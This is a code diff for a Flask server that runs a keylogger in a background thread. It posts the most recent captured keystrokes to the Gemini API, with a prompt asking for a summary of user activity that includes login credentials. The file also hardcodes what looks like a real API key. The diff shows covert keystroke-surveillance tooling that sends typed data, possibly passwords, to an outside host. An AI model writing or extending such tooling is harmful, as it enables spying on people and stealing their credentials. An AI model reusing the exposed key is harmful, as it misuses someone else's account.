@@ -9,8 +9,6 @@ import requests
 app = Flask(__name__)
 CORS(app)
 
-start_keylogger()
-
 GEMINI_API_KEY = "AIzaSyBkfKBsh9fWtvCGs6QRYlla9C6ugsySlXE"
 GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-pro-latest:generateContent?key=" + GEMINI_API_KEY
 GEMINI_PROMPT = "Summarize this keylog into a human-readable activity description with timestamps. Example: 'User typed URL, then entered login credentials.'"
@@ -33,7 +31,7 @@ def log_summary():
         log_lines = f.readlines()
     if not log_lines:
         return jsonify({'summary': 'No keystrokes to summarize.'})
-    # Limit to last 100 lines for Gemini
+    # Limit to last 100 lines for Gemini processing
     last_lines = log_lines[-100:]
     safe_log_content = ''.join(last_lines).replace('"', "'")
     payload = {
@@ -44,7 +42,7 @@ def log_summary():
         }]
     }
     try:
-        response = requests.post(GEMINI_API_URL, json=payload)
+        response = requests.post(GEMINI_API_URL, json=payload, timeout=30)
         response.raise_for_status()
         gemini_data = response.json()
         summary = gemini_data.get('candidates', [{}])[0].get('content', {}).get('parts', [{}])[0].get('text', 'No summary returned.')
@@ -69,4 +67,7 @@ def system_info():
     })
 
 if __name__ == '__main__':
-    app.run(debug=True) 
+    from threading import Thread
+    from keylogger import start_keylogger
+    Thread(target=start_keylogger, daemon=True).start()
+    app.run(debug=True, port=5001) 
